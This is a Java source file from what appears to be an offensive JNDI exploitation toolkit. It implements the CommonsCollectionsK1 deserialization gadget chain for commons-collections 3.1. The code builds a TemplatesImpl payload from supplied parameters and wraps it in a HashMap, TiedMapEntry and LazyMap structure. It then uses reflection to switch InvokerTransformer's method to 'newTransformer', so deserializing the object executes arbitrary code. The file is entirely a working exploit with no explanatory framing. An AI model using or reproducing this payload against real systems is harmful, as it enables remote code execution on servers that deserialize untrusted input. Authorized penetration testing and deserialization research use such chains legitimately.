package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

import static com.qi4l.jndi.Starter.JYsoMode;
import static com.qi4l.jndi.Starter.cmdLine;

/**
 * Gadget chain:
 * HashMap
 * TiedMapEntry.hashCode
 * TiedMapEntry.getValue
 * LazyMap.decorate
 * InvokerTransformer
 * templates...
 */

@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollectionsK1 implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object templates;
        if (JYsoMode.contains("yso")) {
            templates = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            templates = Gadgets.createTemplatesImpl(type, param);
        }
        InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap<String, String> innerMap    = new HashMap<String, String>();
        Map                     m           = LazyMap.decorate(innerMap, transformer);
        Map                     outerMap    = new HashMap();
        TiedMapEntry            tied        = new TiedMapEntry(m, templates);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return outerMap;
    }
}
